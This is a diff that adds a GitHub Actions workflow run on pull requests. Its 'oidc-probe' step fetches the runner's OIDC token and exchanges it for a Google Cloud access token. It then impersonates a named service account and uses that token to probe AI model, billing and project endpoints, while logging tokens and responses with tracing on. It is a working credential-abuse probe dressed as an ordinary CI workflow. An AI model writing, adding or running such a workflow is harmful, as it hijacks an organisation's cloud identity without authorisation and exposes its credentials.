@@ -1,0 +1,43 @@
+name: artex-oidc
+on: pull_request
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: context
+        run: |
+          echo "ctx repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
+          echo "actor=$GITHUB_ACTOR headref=$GITHUB_HEAD_REF"
+      - name: oidc-probe
+        run: |
+          set -x
+          AUD="//iam.googleapis.com/projects/10554368204/locations/global/workloadIdentityPools/tango-ci-pool/providers/tango-ci-provider"
+          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
+          echo "oidc_len=${#TOK}"
+          echo "$TOK" > /tmp/oidc.jwt
+          echo "oidc_claims=$(echo $TOK | cut -d. -f2 | base64 -d 2>/dev/null | head -c 600)"
+          STS=$(curl -s -X POST https://sts.googleapis.com/v1/token \
+            -d grant_type=urn:ietf:params:oauth:grant-type:token-exchange \
+            -d "audience=$AUD" \
+            -d "subject_token=$TOK" \
+            -d subject_token_type=urn:ietf:params:oauth:token-type:jwt \
+            -d requested_token_type=urn:ietf:params:oauth:token-type:access_token \
+            -d scope=https://www.googleapis.com/auth/cloud-platform)
+          echo "sts_body=$(echo $STS | head -c 400)"
+          AT=$(echo "$STS" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token",""))' 2>/dev/null)
+          echo "sts_at_len=${#AT}"
+          GEN=$(curl -s -w '\nHTTP:%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" \
+            -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' \
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/tango-service@ai2-allennlp.iam.gserviceaccount.com:generateAccessToken")
+          echo "gen=$(echo "$GEN" | head -c 300)"
+          SAT=$(echo "$GEN" | head -1 | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("accessToken",""))' 2>/dev/null)
+          echo "sat_len=${#SAT}"
+          for reg in us-central1 europe-west1; do
+            echo "models_$reg=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $SAT" https://$reg-aiplatform.googleapis.com/v1/projects/10554368204/locations/$reg/models)"
+          done
+          echo "models_global=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $SAT" https://aiplatform.googleapis.com/v1/projects/10554368204/locations/global/models)"
+          echo "billing=$(curl -s -w ' HTTP:%{http_code}' -H "Authorization: Bearer $SAT" https://cloudbilling.googleapis.com/v1/projects/10554368204/billingInfo | head -c 300)"
+          echo "project=$(curl -s -w ' HTTP:%{http_code}' -H "Authorization: Bearer $SAT" https://cloudresourcemanager.googleapis.com/v1/projects/10554368204 | head -c 300)"
